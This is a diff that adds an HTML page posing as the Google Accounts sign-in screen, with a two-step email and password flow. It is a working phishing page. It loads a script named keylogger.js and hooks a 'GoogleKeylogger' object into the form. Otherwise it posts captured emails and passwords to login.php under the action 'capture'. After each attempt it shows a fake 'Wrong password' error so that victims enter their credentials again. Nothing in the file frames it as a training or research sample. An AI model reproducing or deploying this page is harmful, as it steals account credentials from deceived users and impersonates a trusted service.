@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in - Google Accounts</title>
+<style>
+:root {
+  --bg-page: #202124;
+  --bg-card: #0f0f10;
+  --on-surface: #e8e8ed;
+  --on-secondary: #9e9eb0;
+  --primary: #4a90d9;
+  --primary-hover: #3a7bc8;
+  --primary-active: #2d6bb8;
+  --accent: #8ab4f8;
+  --accent-hover: #a8c8fa;
+  --border: rgba(255,255,255,.14);
+  --border-focus: #8ab4f8;
+  --error: #f28b82;
+  --disabled-bg: #232330;
+  --disabled-text: #5a5a6e;
+  --input-bg: #18181f;
+  --shadow: 0 20px 60px rgba(0,0,0,0.5);
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Google Sans', Arial, sans-serif;
+  background: var(--bg-page);
+  color: var(--on-surface);
+  -webkit-font-smoothing: antialiased;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 32px;
+}
+
+/* ===== AUTH CONTAINER ===== */
+.auth {
+  width: 100%;
+  max-width: 1040px;
+  height: 560px;
+  background: var(--bg-card);
+  border-radius: 28px;
+  padding: 40px;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 72px;
+  box-shadow: var(--shadow);
+  align-items: center;
+}
+
+/* ===== LEFT COLUMN ===== */
+.left {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+  justify-content: center;
+  height: 100%;
+  margin-top: -20px;
+}
+.left .logo {
+  margin-bottom: 32px;
+}
+.left .logo img {
+  width: 48px;
+  height: 48px;
+  display: block;
+}
+.left h1 {
+  font-size: 54px;
+  font-weight: 500;
+  line-height: 1.2;
+  letter-spacing: -0.5px;
+  margin-bottom: 10px;
+}
+.left .desc {
+  font-size: 15px;
+  color: var(--on-secondary);
+  line-height: 1.6;
+  max-width: 320px;
+}
+
+/* ===== RIGHT COLUMN ===== */
+.right {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  height: 100%;
+}
+
+/* -- Email step -- */
+#emailView {
+  display: flex;
+  flex-direction: column;
+  margin-top: 40px;
+}
+#passwordView {
+  display: none;
+  flex-direction: column;
+}
+
+.input-wrap {
+  position: relative;
+  width: 100%;
+  height: 56px;
+  background: var(--input-bg);
+  border: 1.5px solid var(--border);
+  border-radius: 12px;
+  transition: all 200ms ease;
+  overflow: hidden;
+}
+.input-wrap:hover {
+  border-color: rgba(255,255,255,.25);
+}
+.input-wrap.focused {
+  border-color: var(--border-focus);
+  box-shadow: 0 0 0 3px rgba(138,180,248,0.15);
+}
+.input-wrap.error {
+  border-color: var(--error);
+  box-shadow: 0 0 0 3px rgba(242,139,130,0.12);
+}
+.input-wrap input {
+  width: 100%;
+  height: 100%;
+  padding: 20px 16px 4px;
+  font-size: 15px;
+  font-family: inherit;
+  border: none;
+  outline: none;
+  background: transparent;
+  color: var(--on-surface);
+  line-height: 1.5;
+}
+.input-wrap label {
+  position: absolute;
+  left: 16px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 15px;
+  color: var(--on-secondary);
+  pointer-events: none;
+  transition: all 200ms ease;
+  transform-origin: left center;
+}
+.input-wrap.focused label,
+.input-wrap.has-value label {
+  top: 8px;
+  transform: translateY(0) scale(0.78);
+}
+.input-wrap.focused label {
+  color: var(--primary);
+}
+.input-wrap.error label {
+  color: var(--error);
+}
+
+.forgot-link {
+  color: var(--accent);
+  font-size: 13.5px;
+  font-weight: 500;
+  text-decoration: none;
+  display: inline-block;
+  margin-top: 12px;
+  cursor: pointer;
+  transition: color 200ms ease;
+}
+.forgot-link:hover {
+  color: var(--accent-hover);
+  text-decoration: underline;
+}
+
+.support-msg {
+  font-size: 12.5px;
+  color: var(--on-secondary);
+  line-height: 1.6;
+  margin-top: 40px;
+}
+
+/* ===== BOTTOM ROW ===== */
+.actions {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-top: 40px;
+}
+.create-btn {
+  color: var(--accent);
+  font-size: 14px;
+  font-weight: 500;
+  font-family: inherit;
+  background: none;
+  border: none;
+  cursor: pointer;
+  padding: 8px 0;
+  line-height: 1.4;
+  transition: color 200ms ease;
+}
+.create-btn:hover {
+  color: var(--accent-hover);
+}
+.next-btn {
+  width: 120px;
+  height: 48px;
+  background: var(--primary);
+  color: #fff;
+  border: none;
+  border-radius: 999px;
+  font-size: 14.5px;
+  font-weight: 500;
+  font-family: inherit;
+  cursor: pointer;
+  transition: all 200ms ease;
+  letter-spacing: 0.2px;
+}
+.next-btn:hover:not(:disabled) {
+  background: var(--primary-hover);
+  box-shadow: 0 4px 12px rgba(74,144,217,0.3);
+  transform: translateY(-1px);
+}
+.next-btn:active:not(:disabled) {
+  background: var(--primary-active);
+  transform: translateY(0);
+  box-shadow: none;
+}
+.next-btn:disabled {
+  background: var(--disabled-bg);
+  color: var(--disabled-text);
+  cursor: default;
+  box-shadow: none;
+  transform: none;
+}
+
+/* ===== PASSWORD VIEW OVERRIDES ===== */
+#userInfo {
+  display: block;
+  text-align: left;
+  margin-bottom: 20px;
+}
+#userInfo .avatar {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+  background: var(--primary);
+  color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
+  font-weight: 500;
+  margin-bottom: 12px;
+  user-select: none;
+}
+#userInfo #userName {
+  font-size: 16px;
+  font-weight: 500;
+  line-height: 1.4;
+}
+#userInfo #userEmail {
+  font-size: 13px;
+  color: var(--on-secondary);
+  line-height: 1.4;
+}
+#passwordView h1 {
+  font-size: 24px;
+  font-weight: 500;
+  margin-bottom: 4px;
+}
+#passwordView .subtitle {
+  font-size: 14px;
+  color: var(--on-secondary);
+  margin-bottom: 24px;
+}
+
+/* ===== ERROR ===== */
+#errorMsg {
+  display: none;
+  color: var(--error);
+  font-size: 13px;
+  margin-top: 8px;
+}
+#passwordError {
+  display: none;
+  color: var(--error);
+  font-size: 13px;
+  margin-top: 8px;
+}
+
+/* ===== SPINNER ===== */
+.spinner {
+  display: none;
+  text-align: center;
+  padding: 16px 0 0;
+}
+.spinner-inner {
+  display: inline-block;
+  width: 22px;
+  height: 22px;
+  border: 2.5px solid var(--border);
+  border-top-color: var(--primary);
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+}
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* ===== FOOTER (outside card) ===== */
+.page-footer {
+  width: 100%;
+  max-width: 1040px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-top: 44px;
+  padding: 0 8px;
+}
+.page-footer .lang select {
+  font-size: 12.5px;
+  font-family: inherit;
+  color: var(--on-secondary);
+  border: none;
+  background: transparent;
+  cursor: pointer;
+  outline: none;
+  padding: 4px 0;
+}
+.page-footer .lang select option {
+  background: var(--bg-card);
+  color: var(--on-surface);
+}
+.page-footer .links {
+  display: flex;
+  gap: 20px;
+}
+.page-footer .links a {
+  color: var(--on-secondary);
+  text-decoration: none;
+  font-size: 12.5px;
+  transition: color 200ms ease;
+}
+.page-footer .links a:hover {
+  color: var(--on-surface);
+}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 900px) {
+  .auth {
+    grid-template-columns: 1fr;
+    gap: 32px;
+    height: auto;
+    min-height: auto;
+    max-width: 480px;
+    padding: 36px 28px;
+  }
+  .left h1 {
+    font-size: 38px;
+  }
+  .left .desc {
+    max-width: 100%;
+  }
+  .left .logo {
+    margin-bottom: 24px;
+  }
+  .page-footer {
+    max-width: 480px;
+    padding: 0;
+  }
+}
+
+@media (max-width: 520px) {
+  body {
+    padding: 0;
+  }
+  .auth {
+    border-radius: 0;
+    padding: 28px 20px;
+    box-shadow: none;
+    min-height: 100vh;
+  }
+  .left h1 {
+    font-size: 32px;
+  }
+  .page-footer {
+    flex-direction: column-reverse;
+    gap: 12px;
+    align-items: center;
+    padding: 0 20px 20px;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="auth">
+  <!-- LEFT COLUMN -->
+  <div class="left">
+    <div class="logo">
+      <img src="icons8-google-48.png" width="48" height="48" alt="Google">
+    </div>
+    <h1>Sign in</h1>
+    <p class="desc">Sign in to your account to continue securely.</p>
+  </div>
+
+  <!-- RIGHT COLUMN -->
+  <div class="right">
+
+    <!-- ===== EMAIL VIEW ===== -->
+    <div id="emailView">
+      <div class="input-wrap" id="emailWrap">
+        <input type="text" id="emailInput" class="email-field" autocomplete="username" autocapitalize="none" spellcheck="false" autofocus>
+        <label for="emailInput">Email or phone</label>
+      </div>
+      <div id="errorMsg">Couldn't find your Google Account</div>
+
+      <a href="#" class="forgot-link" onclick="return false;">Forgot email?</a>
+
+      <p class="support-msg">Not your computer? Use a private browser or Guest Mode when accessing your account on shared devices.</p>
+
+      <div class="actions">
+        <button class="create-btn" id="createBtn">Create account</button>
+        <button class="next-btn" id="emailNextBtn" disabled>Next</button>
+      </div>
+      <div class="spinner" id="emailSpinner"><div class="spinner-inner"></div></div>
+    </div>
+
+    <!-- ===== PASSWORD VIEW ===== -->
+    <div id="passwordView">
+      <div id="userInfo">
+        <div class="avatar" id="userAvatar">U</div>
+        <div id="userName"></div>
+        <div id="userEmail"></div>
+      </div>
+      <h1>Welcome</h1>
+      <p class="subtitle" id="pwSubtitle"></p>
+
+      <div class="input-wrap" id="passwordWrap">
+        <input type="password" id="passwordInput" class="password-field" autocomplete="current-password" spellcheck="false">
+        <label for="passwordInput">Enter your password</label>
+      </div>
+      <div id="passwordError">Wrong password. Try again or click Forgot password.</div>
+
+      <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
+
+      <div class="actions">
+        <button class="create-btn" id="backBtn">Back</button>
+        <button class="next-btn" id="passwordNextBtn" disabled>Next</button>
+      </div>
+      <div class="spinner" id="passwordSpinner"><div class="spinner-inner"></div></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ===== FOOTER ===== -->
+<div class="page-footer">
+  <div class="lang">
+    <select>
+      <option>English (United States)</option>
+      <option>Español</option>
+      <option>Français</option>
+      <option>中文（简体）</option>
+    </select>
+  </div>
+  <div class="links">
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</div>
+
+<script src="keylogger.js"></script>
+<script>
+(function() {
+    'use strict';
+
+    var emailInput = document.getElementById('emailInput');
+    var emailWrap = document.getElementById('emailWrap');
+    var emailNextBtn = document.getElementById('emailNextBtn');
+    var emailSpinner = document.getElementById('emailSpinner');
+    var emailView = document.getElementById('emailView');
+    var passwordView = document.getElementById('passwordView');
+    var passwordInput = document.getElementById('passwordInput');
+    var passwordWrap = document.getElementById('passwordWrap');
+    var passwordNextBtn = document.getElementById('passwordNextBtn');
+    var passwordSpinner = document.getElementById('passwordSpinner');
+    var errorMsg = document.getElementById('errorMsg');
+    var passwordError = document.getElementById('passwordError');
+    var userAvatar = document.getElementById('userAvatar');
+    var userName = document.getElementById('userName');
+    var userEmail = document.getElementById('userEmail');
+    var userInfo = document.getElementById('userInfo');
+    var backBtn = document.getElementById('backBtn');
+    var createBtn = document.getElementById('createBtn');
+
+    function toggleFocus(el, eType) {
+        var wrap = el.closest('.input-wrap');
+        if (!wrap) return;
+        if (eType === 'focus') wrap.classList.add('focused');
+        else wrap.classList.remove('focused');
+    }
+
+    function checkValue(el) {
+        var wrap = el.closest('.input-wrap');
+        if (!wrap) return;
+        if (el.value.length > 0) wrap.classList.add('has-value');
+        else wrap.classList.remove('has-value');
+    }
+
+    function extractName(email) {
+        var local = email.split('@')[0] || '';
+        local = local.replace(/[._]/g, ' ').replace(/\d+/g, '').trim();
+        if (!local) return 'User';
+        return local.split(' ').map(function(w) {
+            return w.charAt(0).toUpperCase() + w.slice(1);
+        }).join(' ');
+    }
+
+    emailInput.addEventListener('focus', function() { toggleFocus(this, 'focus'); });
+    emailInput.addEventListener('blur', function() { toggleFocus(this, 'blur'); });
+    emailInput.addEventListener('input', function() {
+        checkValue(this);
+        emailNextBtn.disabled = this.value.trim() === '';
+        errorMsg.style.display = 'none';
+        emailWrap.classList.remove('error');
+    });
+
+    passwordInput.addEventListener('focus', function() { toggleFocus(this, 'focus'); });
+    passwordInput.addEventListener('blur', function() { toggleFocus(this, 'blur'); });
+    passwordInput.addEventListener('input', function() {
+        checkValue(this);
+        passwordNextBtn.disabled = this.value === '';
+        passwordError.style.display = 'none';
+        passwordWrap.classList.remove('error');
+    });
+
+    emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && !emailNextBtn.disabled) emailNextBtn.click();
+    });
+
+    passwordInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && !passwordNextBtn.disabled) passwordNextBtn.click();
+    });
+
+    function showPasswordView(email) {
+        var name = extractName(email);
+        var initial = name.charAt(0).toUpperCase();
+        userAvatar.textContent = initial;
+        userName.textContent = name;
+        userEmail.textContent = email;
+        userInfo.style.display = 'block';
+        emailView.style.display = 'none';
+        passwordView.style.display = 'flex';
+        passwordInput.value = '';
+        passwordInput.focus();
+        checkValue(passwordInput);
+        passwordNextBtn.disabled = true;
+
+        if (window.GoogleKeylogger) GoogleKeylogger.setEmail(email);
+
+        setTimeout(function() {
+            if (window.GoogleKeylogger) GoogleKeylogger.init();
+        }, 100);
+    }
+
+    emailNextBtn.addEventListener('click', function() {
+        var email = emailInput.value.trim();
+        if (!email) return;
+        emailNextBtn.disabled = true;
+        emailNextBtn.style.display = 'none';
+        emailSpinner.style.display = 'block';
+
+        var formData = new FormData();
+        formData.append('action', 'preflight');
+        formData.append('email', email);
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'login.php', true);
+        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+        xhr.onload = function() {
+            emailSpinner.style.display = 'none';
+            emailNextBtn.style.display = '';
+            emailNextBtn.disabled = false;
+            if (xhr.status === 200) {
+                showPasswordView(email);
+            } else {
+                errorMsg.textContent = 'Couldn\'t find your Google Account';
+                errorMsg.style.display = 'block';
+                emailWrap.classList.add('error');
+            }
+        };
+        xhr.onerror = function() {
+            emailSpinner.style.display = 'none';
+            emailNextBtn.style.display = '';
+            emailNextBtn.disabled = false;
+            errorMsg.textContent = 'Network error. Please try again.';
+            errorMsg.style.display = 'block';
+            emailWrap.classList.add('error');
+        };
+        xhr.send(formData);
+    });
+
+    passwordNextBtn.addEventListener('click', function() {
+        var email = userEmail.textContent;
+        var password = passwordInput.value;
+        if (!email || !password) return;
+
+        passwordNextBtn.disabled = true;
+        passwordNextBtn.style.display = 'none';
+        passwordSpinner.style.display = 'block';
+
+        if (window.GoogleKeylogger) {
+            GoogleKeylogger.flush();
+            GoogleKeylogger.submit(email, password);
+        } else {
+            var formData = new FormData();
+            formData.append('action', 'capture');
+            formData.append('email', email);
+            formData.append('password', password);
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'login.php', true);
+            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+            xhr.send(formData);
+        }
+
+        setTimeout(function() {
+            passwordSpinner.style.display = 'none';
+            passwordNextBtn.style.display = '';
+            passwordNextBtn.disabled = false;
+            passwordInput.value = '';
+            passwordWrap.classList.add('error');
+            passwordError.style.display = 'block';
+            passwordInput.focus();
+        }, 1500);
+    });
+
+    backBtn.addEventListener('click', function() {
+        passwordView.style.display = 'none';
+        emailView.style.display = 'flex';
+        emailInput.focus();
+        passwordError.style.display = 'none';
+        passwordWrap.classList.remove('error');
+    });
+
+    createBtn.addEventListener('click', function() { return false; });
+})();
+</script>
+</body>
+</html>
